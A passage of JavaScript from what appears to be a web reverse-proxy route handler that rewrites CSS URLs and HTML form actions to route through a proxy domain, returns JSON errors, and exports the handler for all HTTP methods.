          if (path.startsWith('http') || path.startsWith('data:')) return match;
          return 'url(https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + cssCurrentDir + path + ')';
        });
      }

      if (ct.includes('text/html')) {
        text = text.replace(/action=["'](https?:\/\/[^"']+)["']/gi, (match, url) => {
          try {
            const urlObj = new URL(url);
            if (shouldProxyDomain(urlObj.hostname)) {
              return 'action="https://' + YOUR_DOMAIN + PROXY_PREFIX + urlObj.hostname + urlObj.pathname + urlObj.search + '"';
            }
          } catch(e) {}
          return match;
        });

        text = text.replace(/action="\/([^"]*)"/gi, 
          'action="https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/$1"');
        text = text.replace(/action='\/([^']*)'/gi, 
          "action='https://" + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + "/$1'");
      }

      return new Response(text, { status: resp.status, headers: newHeaders });
    }

    return new Response(resp.body, { status: resp.status, headers: newHeaders });

  } catch (err) {
    console.error('[' + info.type + '] Error:', err);
    return new Response(JSON.stringify({
      error: 'Proxy Error',
      message: err.message,
      stack: err.stack
    }), { status: 502, headers: { 'content-type': 'application/json' } });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
